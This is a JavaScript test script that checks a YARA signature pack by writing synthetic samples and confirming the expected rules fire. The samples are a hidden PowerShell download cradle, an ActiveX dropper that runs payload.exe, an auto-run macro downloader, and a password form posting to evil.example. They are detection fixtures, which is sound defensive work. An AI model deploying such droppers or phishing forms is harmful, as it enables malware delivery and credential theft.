import "dotenv/config";
import fs from "fs/promises";
import os from "os";
import path from "path";
import { config } from "../src/config.js";
import { getYaraRuntimeStatus, resolveYaraRuleFiles, runYaraScan } from "../src/scanner/signatureEngines.js";
import { printErrorLine, printStatusLine } from "./signatureEngineCli.js";

const runtime = await getYaraRuntimeStatus(config);
const ruleFiles = await resolveYaraRuleFiles(config);

if (runtime.status !== "ready") {
  printErrorLine(`YARA issue: ${runtime.detail || "YARA is not ready."}`);
  process.exit(1);
}

printStatusLine(
  "YARA pack",
  `${runtime.version || runtime.binary || "scanner"} ready with ${ruleFiles.length} rule file${ruleFiles.length === 1 ? "" : "s"}`
);

const tempRoot = await fs.mkdtemp(path.join(os.tmpdir(), "virovanta-yara-pack-"));

const samples = [
  {
    name: "powershell-encoded-dropper.ps1",
    content: `powershell.exe -nop -w hidden -enc AAAA
[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("QQ=="))
IEX((New-Object Net.WebClient).DownloadString("https://example.test/a"))
`,
    expectedRules: ["vv_ps_encoded_command_dropper", "vv_ps_lolbin_download_cradle"]
  },
  {
    name: "activex-dropper.js",
    content: `var x = new ActiveXObject("MSXML2.XMLHTTP");
var s = new ActiveXObject("ADODB.Stream");
var sh = new ActiveXObject("WScript.Shell");
s.SaveToFile("payload.exe");
sh.Run("payload.exe");
`,
    expectedRules: ["vv_js_activex_wscript_dropper"]
  },
  {
    name: "macro-document.txt",
    content: `Sub AutoOpen()
CreateObject("WScript.Shell").Run "powershell"
Set x = CreateObject("MSXML2.XMLHTTP")
Set y = CreateObject("ADODB.Stream")
URLDownloadToFile
End Sub
`,
    expectedRules: ["vv_office_macro_autoexec_downloader"]
  },
  {
    name: "credential-kit.html",
    content: `<html><body>
<form method="post" action="https://evil.example/login">
<input type="password" name="password" />
</form>
Please verify your account because your mailbox has been upgraded.
office365
</body></html>
`,
    expectedRules: ["vv_html_credential_harvest_kit"]
  },
  {
    name: "archive-bait.zip",
    content: Buffer.from("504b0304696e766f6963652e6a7300646f63756d656e74", "hex"),
    expectedRules: ["vv_archive_script_or_shortcut_payload"]
  }
];

let failures = 0;

for (const sample of samples) {
  const samplePath = path.join(tempRoot, sample.name);
  await fs.writeFile(samplePath, sample.content);

  const result = await runYaraScan(samplePath, config);
  if (result.status !== "matched") {
    failures += 1;
    printErrorLine(`Sample failed: ${sample.name} did not produce a YARA match.`);
    continue;
  }

  const missingExpectedRules = sample.expectedRules.filter((ruleName) => !(result.matchedRules || []).includes(ruleName));
  if (missingExpectedRules.length > 0) {
    failures += 1;
    printErrorLine(`Sample failed: ${sample.name} missed expected rules: ${missingExpectedRules.join(", ")}`);
    continue;
  }

  printStatusLine("Sample ok", `${sample.name} -> ${(result.matchedRules || []).join(", ")}`);
}

await fs.rm(tempRoot, { recursive: true, force: true });

if (failures > 0) {
  process.exit(1);
}

printStatusLine("YARA pack", "synthetic validation passed");
